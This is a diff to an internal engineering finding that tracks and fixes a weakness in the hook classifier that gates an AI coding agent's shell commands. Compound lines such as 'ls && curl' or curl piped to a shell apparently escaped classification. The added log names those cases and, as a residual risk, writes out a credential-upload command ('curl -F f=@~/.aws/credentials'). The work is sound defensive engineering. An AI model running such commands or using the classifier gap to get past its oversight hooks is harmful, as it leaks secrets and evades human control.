@@ -2,7 +2,7 @@
 
 **Found 2026-10-25, empirically**, while probing ECC's PreToolUse hooks and `harness
 cc-hook` with the same inputs (see [`docs/benchmarks/ecc/`](../../docs/benchmarks/ecc/)).
-Not yet a Linear issue.
+Linear [AI2-79](https://linear.app/ai2rules/issue/AI2-79).
 
 ## The finding
 
@@ -72,3 +72,29 @@ OpenCode, the default world, and the one-kernel demo world.
 Whichever fix lands needs a conformance case in `docs/demos/one-kernel/` (the case set is
 shared by every host), a D62 addendum, `scripts/check-demos.sh`, the WASM refresh, and a
 re-run of the governance benchmark, because the kernel changes.
+
+## Development — 2026-10-25 (AI2-79)
+
+**Moved to development.** Fixed on branch `ccr-eb7fe457-6w396o`, decision **D90**. A class
+now decides only if it matches every simple command on the line:
+
+- the split is at `;`, `&`, `|` and newlines;
+- quoted spans are blanked and comments are dropped;
+- redirections stay whole;
+- substitutions and unterminated quotes go to `default_to`.
+
+This is candidate fix 1 refined toward 2, without a parser. It can only move a verdict
+toward `default_to`.
+
+- Kernel: `CompiledWorld::classify_command` + `simple_commands` (`crates/harness-types/src/compiled.rs`).
+- Tests: `harness-preview` `a_class_must_account_for_every_simple_command`,
+  `a_line_the_class_fully_covers_keeps_its_class`, `a_line_the_splitter_cannot_see_into_fails_closed`;
+  two older expectations corrected (`ls && curl` and `curl\nhttp://x` are not pure egress).
+- Conformance: `curl_piped_to_shell_asks` in `docs/demos/one-kernel/cases.yaml`, shared by every host.
+- Re-run: the whole probe table above is now ASK in a clean session.
+- Unchanged: governance bench (no drift) and `check-demos.sh`. WASM rebuilt (wasm-opt 117)
+  and freshness passes.
+- Residual (D90): one plain network command still runs silently in a clean session,
+  including `curl -F f=@~/.aws/credentials …`.
+
+Remaining for done: review and merge. Linear moves AI2-79 when the PR merges.
